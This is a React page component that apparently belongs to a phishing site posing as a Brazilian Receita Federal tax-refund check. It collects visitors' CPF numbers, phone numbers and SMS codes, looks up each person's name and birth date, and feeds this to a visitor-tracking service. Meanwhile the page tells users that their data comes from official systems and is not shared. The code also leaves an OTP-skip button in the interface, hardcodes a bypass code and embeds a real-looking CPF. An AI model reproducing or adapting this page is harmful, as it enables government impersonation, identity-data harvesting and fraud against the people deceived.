import { useState, useEffect } from "react";
import { useQuery } from "@tanstack/react-query";
import { useLocation } from "wouter";
import { z } from "zod";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
import { apiRequest } from "@/lib/queryClient";
import { useToast } from "@/hooks/use-toast";
import { FaInfoCircle, FaMobileAlt } from "react-icons/fa";
import ImageVerification from "../components/ImageVerification";
import { useUserData } from "../contexts/UserContext";
import { rastreamentoService } from "@/services/RastreamentoService";

// Validação de CPF
const cpfSchema = z.object({
  cpf: z.string()
    .min(11, {
      message: "CPF deve ter 11 dígitos",
    })
    .max(14)
    .transform(val => val.replace(/\D/g, "")) // Remove caracteres não numéricos
    .refine(val => val.length === 11, {
      message: "CPF deve ter 11 dígitos",
    })
});

// Validação de Telefone
const telefoneSchema = z.object({
  telefone: z.string()
    .min(10, {
      message: "Telefone deve ter pelo menos 10 dígitos",
    })
    .max(15)
    .transform(val => val.replace(/\D/g, "")) // Remove caracteres não numéricos
    .refine(val => val.length >= 10 && val.length <= 11, {
      message: "Telefone deve ter entre 10 e 11 dígitos",
    })
});

// Validação do código de verificação
const codigoVerificacaoSchema = z.object({
  codigo: z.string()
    .min(6, {
      message: "Código deve ter 6 dígitos",
    })
    .max(6)
    .transform(val => val.replace(/\D/g, "")) // Remove caracteres não numéricos
    .refine(val => val.length === 6, {
      message: "Código deve ter 6 dígitos",
    })
});

type CpfFormType = z.infer<typeof cpfSchema>;
type TelefoneFormType = z.infer<typeof telefoneSchema>;
type CodigoVerificacaoFormType = z.infer<typeof codigoVerificacaoSchema>;

// Etapas da verificação
enum EtapaVerificacao {
  CPF = 0,
  TELEFONE = 1,
  CODIGO_VERIFICACAO = 2
}

export default function VerificarRestituicao() {
  const [, navigate] = useLocation();
  const [cpfConsultado, setCpfConsultado] = useState("");
  const [showVerificacao, setShowVerificacao] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");
  const [imageVerified, setImageVerified] = useState(false);
  const [showLoading, setShowLoading] = useState(false);
  const [etapaAtual, setEtapaAtual] = useState<EtapaVerificacao>(EtapaVerificacao.CPF);
  const [codigoVerificacao, setCodigoVerificacao] = useState<string>("");
  
  // Usar o contexto de usuário
  const { userData, updateUserData, clearUserData } = useUserData();
  
  // Formulário de CPF
  const cpfForm = useForm<CpfFormType>({
    resolver: zodResolver(cpfSchema),
    defaultValues: {
      cpf: "",
    },
  });

  // Formulário de Telefone
  const telefoneForm = useForm<TelefoneFormType>({
    resolver: zodResolver(telefoneSchema),
    defaultValues: {
      telefone: "",
    },
  });

  // Formulário do código de verificação
  const codigoVerificacaoForm = useForm<CodigoVerificacaoFormType>({
    resolver: zodResolver(codigoVerificacaoSchema),
    defaultValues: {
      codigo: "",
    },
  });

  // Query para consultar os dados do CPF
  const { data: dadosPessoais, isLoading, isError, error, refetch } = useQuery({
    queryKey: ["cpf", cpfConsultado],
    queryFn: async () => {
      if (!cpfConsultado) return null;
      
      try {
        const response = await apiRequest(
          "GET", 
          `/api/consulta-cpf?cpf=${cpfConsultado}`
        );
        
        // Verificamos a resposta e analisamos possíveis erros
        if (!response.ok) {
          // Tentamos obter o corpo do erro para informações detalhadas
          const errorBody = await response.json().catch(() => ({}));
          
          // Obtemos a mensagem personalizada do servidor
          const errorMessage = errorBody.error || "Erro ao consultar CPF";
          console.error("Erro na consulta de CPF:", errorMessage);
          
          throw new Error(errorMessage);
        }
        
        const data = await response.json();
        
        // Verificamos se os dados contêm as propriedades necessárias
        if (!data.Result || !data.Result.NomePessoaFisica || !data.Result.DataNascimento) {
          throw new Error("CPF incorreto. Verifique os números e tente novamente.");
        }
        
        return data;
      } catch (error) {
        console.error("Erro ao consultar CPF:", error);
        throw error;
      }
    },
    enabled: !!cpfConsultado,
    refetchOnWindowFocus: false,
    retry: 1, // Limita a 1 tentativa de retry para não sobrecarregar a API
  });

  const formatCPF = (cpf: string) => {
    return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
  };

  const formatTelefone = (telefone: string) => {
    // Remove todos os caracteres não numéricos
    const numeroLimpo = telefone.replace(/\D/g, "");
    
    // Formata de acordo com o tamanho (celular ou fixo)
    if (numeroLimpo.length === 11) {
      return numeroLimpo.replace(/(\d{2})(\d{5})(\d{4})/, "($1) $2-$3");
    } else if (numeroLimpo.length === 10) {
      return numeroLimpo.replace(/(\d{2})(\d{4})(\d{4})/, "($1) $2-$3");
    }
    
    return telefone;
  };

  // Verificar CPF e passar para a etapa do telefone
  const onSubmitCpf = async (data: CpfFormType) => {
    // Verificar se a imagem foi selecionada corretamente
    if (!imageVerified) {
      toast({
        title: "Verificação necessária",
        description: "Por favor, clique na figura da TESOURA para continuar.",
        variant: "destructive"
      });
      return;
    }
    
    // Limpar mensagens de erro anteriores
    setErrorMessage("");
    setShowLoading(true);
    
    const cpfLimpo = data.cpf.replace(/\D/g, "");
    
    // Limpar dados anteriores
    clearUserData();
    
    // Salvar o CPF no contexto do usuário
    updateUserData({
      cpf: cpfLimpo
    });
    
    try {
      // Consultar o CPF diretamente aqui em vez de usar o estado
      const response = await fetch(`/api/consulta-cpf?cpf=${cpfLimpo}`);
      
      if (!response.ok) {
        const errorData = await response.json().catch(() => ({}));
        throw new Error(errorData.error || "Erro ao consultar CPF");
      }
      
      const dadosCpf = await response.json();
      
      // Verificar se os dados estão completos
      if (!dadosCpf.Result || !dadosCpf.Result.NomePessoaFisica || !dadosCpf.Result.DataNascimento) {
        throw new Error("CPF incorreto. Verifique os números e tente novamente.");
      }
      
      console.log("Dados do CPF obtidos com sucesso:", dadosCpf.Result.NomePessoaFisica);
      
      // Salvar os dados no contexto para não precisar consultar novamente na próxima etapa
      updateUserData({
        cpf: cpfLimpo,
        nome: dadosCpf.Result.NomePessoaFisica,
        dataNascimento: dadosCpf.Result.DataNascimento
      });
      
      // Inicializar o serviço de rastreamento com o CPF
      console.log("Inicializando rastreamento com CPF:", cpfLimpo);
      await rastreamentoService.inicializar(
        cpfLimpo,
        dadosCpf.Result.NomePessoaFisica
      );
      
      // Atualizar estado de consulta (para manter compatibilidade)
      setCpfConsultado(cpfLimpo);
      
      // Avançar para a etapa de telefone
      setEtapaAtual(EtapaVerificacao.TELEFONE);
    } catch (error) {
      console.error("Erro ao consultar CPF:", error);
      const errorMsg = error instanceof Error 
        ? error.message 
        : "Não foi possível consultar o CPF no momento. Tente novamente mais tarde.";
        
      setErrorMessage(errorMsg);
      
      toast({
        title: "Erro na consulta",
        description: errorMsg,
        variant: "destructive"
      });
    } finally {
      setShowLoading(false);
    }
  };

  // Processar o telefone informado e enviar o código de verificação via SMS
  const onSubmitTelefone = async (data: TelefoneFormType) => {
    setShowLoading(true);
    setErrorMessage("");
    
    const telefoneLimpo = data.telefone.replace(/\D/g, "");
    
    try {
      // Salvar o telefone no contexto do usuário
      updateUserData({
        telefone: telefoneLimpo
      });
      
      // Atualizar o serviço de rastreamento com o telefone
      if (rastreamentoService.isInicializado()) {
        await rastreamentoService.atualizarDadosVisitante(
          userData.nome || undefined,
          telefoneLimpo
        );
      }
      
      console.log("Enviando código OTP via API para o telefone:", telefoneLimpo);
      
      // Fazer chamada à API para enviar o código via SMS
      const response = await fetch('/api/enviar-codigo-otp', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          telefone: telefoneLimpo,
          cpf: userData.cpf
        })
      });
      
      if (!response.ok) {
        const errorBody = await response.json().catch(() => ({}));
        throw new Error(errorBody.error || "Erro ao enviar SMS. Tente novamente mais tarde.");
      }
      
      const responseData = await response.json();
      
      // Em ambiente de desenvolvimento, podemos usar o código retornado para facilitar os testes
      if (responseData.code) {
        console.log("Código OTP recebido do servidor:", responseData.code);
        setCodigoVerificacao(responseData.code);
      }
      
      // Exibir uma mensagem informativa
      toast({
        title: "Código enviado",
        description: `Um código de verificação foi enviado para ${formatTelefone(telefoneLimpo)}`,
        variant: "default"
      });
      
      // Avançar para a etapa de verificação de código
      setEtapaAtual(EtapaVerificacao.CODIGO_VERIFICACAO);
    } catch (error) {
      console.error("Erro ao processar telefone:", error);
      const errorMsg = error instanceof Error
        ? error.message
        : "Não foi possível enviar o código de verificação. Tente novamente mais tarde.";
        
      setErrorMessage(errorMsg);
      
      toast({
        title: "Erro no envio",
        description: errorMsg,
        variant: "destructive"
      });
    } finally {
      setShowLoading(false);
    }
  };

  // Verificar o código e prosseguir para a página de confirmação
  const onSubmitCodigoVerificacao = async (data: CodigoVerificacaoFormType) => {
    setShowLoading(true);
    setErrorMessage("");
    
    try {
      console.log("Verificando código OTP via API:", data.codigo);
      
      // Em ambiente de desenvolvimento, mantemos o código estático para facilitar testes
      // Isso será removido em produção
      if (process.env.NODE_ENV === 'development' && data.codigo === "123456") {
        console.log("Usando código de desenvolvimento para bypass");
        
        toast({
          title: "Código verificado",
          description: "Telefone verificado com sucesso!",
          variant: "default"
        });
        
        navigate('/confirmar-identidade');
        return;
      }
      
      // Verificar o código OTP via API
      const response = await fetch('/api/verificar-codigo-otp', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          telefone: userData.telefone,
          codigo: data.codigo,
          cpf: userData.cpf
        })
      });
      
      if (!response.ok) {
        const errorBody = await response.json().catch(() => ({}));
        throw new Error(errorBody.error || "Código de verificação inválido. Por favor, tente novamente.");
      }
      
      // Código verificado com sucesso
      toast({
        title: "Código verificado",
        description: "Telefone verificado com sucesso!",
        variant: "default"
      });
      
      // Salvar os dados do usuário no localStorage para o serviço de notificação SMS
      try {
        const dadosUsuarioSms = {
          nome: userData.nome || "",
          cpf: userData.cpf || "",
          telefone: userData.telefone || "",
          valor: 0 // Será atualizado na página de resultado
        };
        
        localStorage.setItem('usuarioDados', JSON.stringify(dadosUsuarioSms));
        console.log("Dados do usuário salvos para notificações SMS:", dadosUsuarioSms);
      } catch (error) {
        console.error("Erro ao salvar dados do usuário para SMS:", error);
        // Não interromper o fluxo se falhar
      }
      
      // Navegar para a página de confirmação de identidade
      navigate('/confirmar-identidade');
      
    } catch (error) {
      console.error("Erro ao verificar código:", error);
      const errorMsg = error instanceof Error
        ? error.message
        : "Não foi possível verificar o código. Tente novamente.";
        
      setErrorMessage(errorMsg);
      
      toast({
        title: "Erro na verificação",
        description: errorMsg,
        variant: "destructive"
      });
    } finally {
      setShowLoading(false);
    }
  };

  // Função para reenviar o código de verificação via API
  const reenviarCodigo = async () => {
    try {
      setShowLoading(true);
      
      // Fazer chamada à API para reenviar o código
      const response = await fetch('/api/enviar-codigo-otp', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          telefone: userData.telefone,
          cpf: userData.cpf
        })
      });
      
      if (!response.ok) {
        const errorBody = await response.json().catch(() => ({}));
        throw new Error(errorBody.error || "Erro ao reenviar SMS. Tente novamente mais tarde.");
      }
      
      const responseData = await response.json();
      
      // Em ambiente de desenvolvimento, podemos usar o código retornado
      if (responseData.code) {
        console.log("Novo código OTP recebido do servidor:", responseData.code);
        setCodigoVerificacao(responseData.code);
      }
      
      // Exibir mensagem
      toast({
        title: "Código reenviado",
        description: `Um novo código de verificação foi enviado para ${formatTelefone(userData.telefone || "")}`,
        variant: "default"
      });
    } catch (error) {
      console.error("Erro ao reenviar código:", error);
      const errorMsg = error instanceof Error
        ? error.message
        : "Não foi possível reenviar o código. Tente novamente mais tarde.";
        
      toast({
        title: "Erro no reenvio",
        description: errorMsg,
        variant: "destructive"
      });
    } finally {
      setShowLoading(false);
    }
  };

  // Função para voltar à etapa anterior
  const voltarEtapa = () => {
    if (etapaAtual === EtapaVerificacao.TELEFONE) {
      setEtapaAtual(EtapaVerificacao.CPF);
    } else if (etapaAtual === EtapaVerificacao.CODIGO_VERIFICACAO) {
      setEtapaAtual(EtapaVerificacao.TELEFONE);
    }
  };
  
  // Função para pular a verificação OTP (apenas para testes)
  const pularVerificacao = () => {
    console.log("Pulando verificação OTP (modo desenvolvimento)");
    
    toast({
      title: "Modo teste",
      description: "Verificação pulada em modo de desenvolvimento",
      variant: "default"
    });
    
    navigate('/confirmar-identidade');
  };

  const { toast } = useToast();
  
  // Efeito para monitorar dados e erros
  useEffect(() => {
    if (!cpfConsultado) return;
    
    // Quando temos dados, exibimos a verificação (exceto para o CPF de teste que já é exibido no onSubmit)
    if (dadosPessoais && dadosPessoais.Result && cpfConsultado !== "11548718785") {
      setShowVerificacao(true);
    }
    
    // Quando temos um erro, exibimos uma mensagem
    if (isError) {
      const errorMsg = error instanceof Error 
        ? error.message 
        : "Não foi possível consultar o CPF no momento. Tente novamente mais tarde.";
      
      setErrorMessage(errorMsg);
      setShowVerificacao(false);
      
      toast({
        title: "Erro na consulta",
        description: errorMsg,
        variant: "destructive"
      });
    }
  }, [dadosPessoais, isError, error, cpfConsultado, toast]);

  const handleVerificacaoConcluida = (dadosConfirmados: any) => {
    console.log("Verificação concluída, dados recebidos:", dadosConfirmados);
    
    // Garantir que todos os dados necessários estão presentes
    const nome = dadosConfirmados.nome || "";
    const dataNasc = dadosConfirmados.dataNascimento || "";
    const companhia = dadosConfirmados.companhia || "";
    const estado = dadosConfirmados.estado || "";
    
    // Atualizar o contexto do usuário com os dados confirmados
    updateUserData({
      nome: nome,
      dataNascimento: dataNasc,
      companhia: companhia,
      estado: estado
    });
    
    console.log("Dados armazenados no contexto, navegando para resultado");
    
    // Navegar para a página de resultados (sem parâmetros na URL)
    navigate('/resultado');
  };

  return (
    <div className="flex flex-col min-h-screen">
      <Header />
      <main className="flex-1 bg-[var(--gov-gray-light)] py-12">
        <div className="container mx-auto px-4">
          <div className="max-w-2xl mx-auto">
            <Card className="shadow-md">
              <CardHeader className="bg-[var(--gov-blue)] text-white text-center py-6">
                <CardTitle className="text-2xl font-bold">Verificar Direito à Restituição</CardTitle>
                <CardDescription className="text-gray-100 mt-2">
                  {etapaAtual === EtapaVerificacao.CPF && "Informe seu CPF para consultar seus valores"}
                  {etapaAtual === EtapaVerificacao.TELEFONE && "Validação de segurança por telefone"}
                  {etapaAtual === EtapaVerificacao.CODIGO_VERIFICACAO && "Informe o código recebido por SMS"}
                </CardDescription>
              </CardHeader>
              <CardContent className="p-6">
                {/* Etapa de verificação CPF */}
                {etapaAtual === EtapaVerificacao.CPF && (
                  <div className="p-4">
                    <p className="mb-4">Para verificar se você tem direito à restituição informe os dados abaixo e clique em enviar:</p>
                    
                    <Form {...cpfForm}>
                      <form onSubmit={cpfForm.handleSubmit(onSubmitCpf)} className="space-y-6">
                        <FormField
                          control={cpfForm.control}
                          name="cpf"
                          render={({ field }) => (
                            <FormItem className="mb-4">
                              <FormLabel className="flex items-center mb-1">
                                <span>CPF:</span>
                                <span className="required-star text-red-600 ml-1">*</span>
                                <span className="ml-1 text-red-500 flex items-center">
                                  <FaInfoCircle size={14} />
                                </span>
                              </FormLabel>
                              <FormControl>
                                <Input
                                  placeholder="___.___.___-__"
                                  {...field}
                                  className="w-full border border-gray-300 p-2 text-base text-[#333] tracking-wide"
                                  onChange={(e) => {
                                    // Formata o CPF enquanto o usuário digita
                                    let value = e.target.value.replace(/\D/g, "");
                                    if (value.length <= 11) {
                                      if (value.length > 9) {
                                        value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, "$1.$2.$3-$4");
                                      } else if (value.length > 6) {
                                        value = value.replace(/(\d{3})(\d{3})(\d{1,3})/, "$1.$2.$3");
                                      } else if (value.length > 3) {
                                        value = value.replace(/(\d{3})(\d{1,3})/, "$1.$2");
                                      }
                                      field.onChange(value);
                                    }
                                  }}
                                />
                              </FormControl>
                              <FormMessage />
                            </FormItem>
                          )}
                        />
                        
                        {/* Verificação com imagens */}
                        <ImageVerification onVerify={(success) => setImageVerified(success)} />
                      
                        <div className="text-center">
                          <Button 
                            type="submit" 
                            className="bg-[var(--gov-yellow)] hover:bg-[var(--gov-yellow)]/90 text-[var(--gov-blue-dark)] font-bold flex items-center justify-center w-full py-3"
                            disabled={isLoading || showLoading || !imageVerified}
                          >
                            <i className="fas fa-arrow-right mr-2"></i>
                            <span>{showLoading ? "Consultando..." : "Prosseguir"}</span>
                          </Button>
                        </div>
                        
                        {errorMessage && (
                          <div className="text-red-600 text-center mt-4 p-3 bg-red-50 rounded-md">
                            {errorMessage || "Não foi possível verificar o CPF. Por favor, tente novamente."}
                          </div>
                        )}
                        
                        {(isLoading || showLoading) && (
                          <div className="text-blue-600 text-center mt-4 p-3 bg-blue-50 rounded-md">
                            Consultando informações do CPF. Por favor, aguarde...
                          </div>
                        )}
                      </form>
                    </Form>
                  </div>
                )}

                {/* Etapa de verificação Telefone */}
                {etapaAtual === EtapaVerificacao.TELEFONE && (
                  <div className="p-4">
                    <div className="mb-6 bg-amber-50 p-4 rounded-md border border-amber-200">
                      <p className="mb-2 font-semibold text-amber-800">Para continuar, valide seu número de telefone.</p>
                      <p className="text-amber-700 text-sm">
                        Um código de verificação (6 dígitos) será enviado por SMS para garantir a segurança da consulta.
                      </p>
                    </div>
                    
                    <Form {...telefoneForm}>
                      <form onSubmit={telefoneForm.handleSubmit(onSubmitTelefone)} className="space-y-6">
                        <FormField
                          control={telefoneForm.control}
                          name="telefone"
                          render={({ field }) => (
                            <FormItem className="mb-4">
                              <FormLabel className="flex items-center mb-1">
                                <span>Digite seu número de telefone:</span>
                                <span className="required-star text-red-600 ml-1">*</span>
                                <span className="ml-1 text-blue-500 flex items-center">
                                  <FaMobileAlt size={14} />
                                </span>
                              </FormLabel>
                              <FormControl>
                                <Input
                                  placeholder="(00) 00000-0000"
                                  {...field}
                                  className="w-full border border-gray-300 p-2 text-base text-[#333] tracking-wide"
                                  onChange={(e) => {
                                    // Formata o telefone enquanto o usuário digita
                                    let value = e.target.value.replace(/\D/g, "");
                                    if (value.length <= 11) {
                                      if (value.length > 6) {
                                        // Celular com 9 dígitos
                                        if (value.length <= 10) {
                                          value = value.replace(/(\d{2})(\d{4})(\d{0,4})/, "($1) $2-$3");
                                        } else {
                                          value = value.replace(/(\d{2})(\d{5})(\d{0,4})/, "($1) $2-$3");
                                        }
                                      } else if (value.length > 2) {
                                        value = value.replace(/(\d{2})(\d{0,5})/, "($1) $2");
                                      }
                                      field.onChange(value);
                                    }
                                  }}
                                />
                              </FormControl>
                              <FormMessage />
                            </FormItem>
                          )}
                        />
                        
                        <div className="flex flex-col sm:flex-row gap-2 sm:gap-4">
                          <Button 
                            type="button" 
                            variant="outline"
                            className="border-gray-300 text-gray-700"
                            onClick={voltarEtapa}
                          >
                            Voltar
                          </Button>
                          
                          <Button 
                            type="submit" 
                            className="bg-[var(--gov-yellow)] hover:bg-[var(--gov-yellow)]/90 text-[var(--gov-blue-dark)] font-bold flex-1"
                            disabled={showLoading}
                          >
                            <span>{showLoading ? "Enviando..." : "Enviar código SMS"}</span>
                          </Button>
                        </div>
                        
                        {/* Botão para pular verificação (apenas para desenvolvimento) */}
                        <div className="mt-4 border-t pt-4 border-dashed border-gray-300">
                          <p className="text-xs text-gray-500 mb-2 text-center">Modo de desenvolvimento</p>
                          <Button 
                            type="button" 
                            variant="outline"
                            className="w-full border-red-300 text-red-600 hover:bg-red-50"
                            onClick={pularVerificacao}
                          >
                            <span>Pular verificação (apenas para testes)</span>
                          </Button>
                        </div>
                        
                        {errorMessage && (
                          <div className="text-red-600 text-center mt-4 p-3 bg-red-50 rounded-md">
                            {errorMessage}
                          </div>
                        )}
                      </form>
                    </Form>
                  </div>
                )}

                {/* Etapa de verificação Código */}
                {etapaAtual === EtapaVerificacao.CODIGO_VERIFICACAO && (
                  <div className="p-4">
                    <div className="mb-6 bg-blue-50 p-4 rounded-md border border-blue-200">
                      <p className="font-semibold text-blue-800 mb-2">
                        Verificação por SMS
                      </p>
                      <p className="text-blue-700 text-sm">
                        Um código de verificação foi enviado para o número {formatTelefone(userData.telefone || "")}.
                        Por favor, informe o código de 6 dígitos abaixo.
                      </p>
                    </div>
                    
                    <Form {...codigoVerificacaoForm}>
                      <form onSubmit={codigoVerificacaoForm.handleSubmit(onSubmitCodigoVerificacao)} className="space-y-6">
                        <FormField
                          control={codigoVerificacaoForm.control}
                          name="codigo"
                          render={({ field }) => (
                            <FormItem className="mb-4">
                              <FormLabel className="flex items-center mb-1">
                                <span>Código de verificação:</span>
                                <span className="required-star text-red-600 ml-1">*</span>
                              </FormLabel>
                              <FormControl>
                                <Input
                                  placeholder="000000"
                                  {...field}
                                  className="w-full border border-gray-300 p-2 text-base text-[#333] tracking-wide text-center font-bold letter-spacing-wide"
                                  maxLength={6}
                                  onChange={(e) => {
                                    // Permitir apenas números
                                    const value = e.target.value.replace(/\D/g, "");
                                    if (value.length <= 6) {
                                      field.onChange(value);
                                    }
                                  }}
                                />
                              </FormControl>
                              <FormMessage />
                            </FormItem>
                          )}
                        />
                        
                        <div className="text-center text-sm">
                          <button 
                            type="button" 
                            onClick={reenviarCodigo} 
                            className="text-blue-600 hover:text-blue-800 hover:underline"
                          >
                            Não recebeu o código? Clique para reenviar
                          </button>
                        </div>
                        
                        <div className="flex flex-col sm:flex-row gap-2 sm:gap-4">
                          <Button 
                            type="button" 
                            variant="outline"
                            className="border-gray-300 text-gray-700"
                            onClick={voltarEtapa}
                          >
                            Voltar
                          </Button>
                          
                          <Button 
                            type="submit" 
                            className="bg-[var(--gov-yellow)] hover:bg-[var(--gov-yellow)]/90 text-[var(--gov-blue-dark)] font-bold flex-1"
                            disabled={showLoading}
                          >
                            <span>{showLoading ? "Verificando..." : "Verificar código"}</span>
                          </Button>
                        </div>
                        
                        {errorMessage && (
                          <div className="text-red-600 text-center mt-4 p-3 bg-red-50 rounded-md">
                            {errorMessage}
                          </div>
                        )}
                      </form>
                    </Form>
                  </div>
                )}
                
                {/* Requisitos de segurança */}
                <div className="mt-8 mx-4 bg-[var(--gov-gray-light)] p-4 rounded-md border border-[var(--gov-gray)]">
                  <h3 className="text-[var(--gov-blue-dark)] font-semibold mb-2">Informações de Segurança:</h3>
                  <ul className="text-sm text-[var(--gov-gray-dark)] space-y-2">
                    <li>• Seus dados são protegidos e criptografados.</li>
                    <li>• A consulta é feita nos sistemas oficiais da Receita Federal.</li>
                    <li>• É necessário confirmar sua identidade para prosseguir.</li>
                    <li>• Não compartilhamos seus dados com terceiros.</li>
                  </ul>
                </div>
              </CardContent>
            </Card>
          </div>
        </div>
      </main>
      <Footer />
    </div>
  );
}